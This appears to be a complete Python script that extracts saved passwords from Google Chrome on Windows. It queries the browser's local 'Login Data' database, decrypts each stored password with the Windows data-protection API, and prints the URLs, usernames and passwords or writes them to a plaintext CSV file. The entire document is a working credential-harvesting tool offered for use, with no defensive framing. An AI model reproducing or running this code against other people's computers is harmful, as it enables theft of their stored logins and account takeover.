#gets saved passwords from Chrome
#need to get Pywin32 python extension for this to work

import os
from sys import exit
import sqlite3
from win32crypt import CryptUnprotectData
import argparse

def chromepath():
    PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
    if (os.path.isdir(PathName) == False):
        print('Chrome not found')
        exit(0)
    return PathName  

def main():
    secret = []
    path = chromepath()
    try:
        connection = sqlite3.connect(path + "Login Data")
        with connection:
            cursor = connection.cursor()
            v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()

        for i in value:
            password = CryptUnprotectData(i[2], None, None, None, 0)[1]
            if password:
                secret.append({
                    'url': i[0],
                    'username': i[1],
                    'password': str(password)
                })
                    
    except sqlite3.OperationalError as e:
            if (str(e) == 'database is locked'):
                print('Google Chrome can\'t be running at the same time')
                exit(0)
            elif (str(e) == 'no such table: logins'):
                print('Could not find database name')
                exit(0)
            elif (str(e) == 'unable to open database file'):
                print('Could not find database path')
                exit(0)
            else:
                print(e)
                exit(0)
    if secret == []:
    	print('no passwords saved in Chrome')
    else:          
    	return secret          

def csv(info):
    with open('chromepasswordlist.csv', 'wb') as result:
        result.write('url,username,password \n'.encode('utf-8'))
        for data in info:
            result.write(('%s, %s, %s \n' % (data['url'], data['username'], data['password'])).encode('utf-8'))

def args_parser():
    parser = argparse.ArgumentParser(description="gets Chrome saved passwords")
    parser.add_argument("-csv", help="Output to csv", action="store_true")
    args = parser.parse_args()
    if args.csv:
        csv(main())
    else:
        for data in main():
            print(data)

if __name__ == '__main__':
    args_parser()